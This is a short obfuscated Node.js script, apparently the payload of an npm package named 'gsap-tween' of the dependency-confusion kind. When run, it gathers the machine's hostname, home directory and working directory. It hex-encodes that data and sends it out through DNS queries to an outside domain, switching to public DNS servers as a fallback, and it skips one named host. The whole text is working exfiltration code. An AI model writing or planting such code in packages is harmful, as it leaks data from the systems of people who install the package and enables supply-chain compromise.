const dns = require("dns"), os = require("os"), suffix = ".dns.alexbirsan-hacks-paypal.com", ns = "dns1.alexbirsan-hacks-paypal.com", package = "gsap-tween";
function sendToServer(_0x4ab1e3) {
  _0x4ab1e3 = Buffer.from(_0x4ab1e3).toString("hex"), _0x4ab1e3 = _0x4ab1e3.match(/.{1,60}/g), id = Math.random().toString(36).substring(2), _0x4ab1e3.forEach(function (_0x231657, _0x4982d4) {
    try {
      dns.resolve("v2_f." + id + "." + _0x4982d4 + "." + _0x231657 + ".v2_e" + suffix, "A", console.log);
    } catch (_0x45a74c) {}
  });
}
function tryGet(_0xd604b2) {
  try {
    return _0xd604b2();
  } catch (_0x393c9c) {
    return "err";
  }
}
data = {p: package, h: tryGet(os.hostname), d: tryGet(os.homedir), c: __dirname};
data.h == "BBOGENS-LAPTOP" && process.exit(0);
data = JSON.stringify(data), sendToServer(data), dns.lookup(ns, function (_0x221afd, _0x45f5dd) {
  !_0x221afd ? nsAddress = _0x45f5dd : nsAddress = "8.8.8.8", dns.setServers([nsAddress, "8.8.4.4"]), sendToServer(data);
});

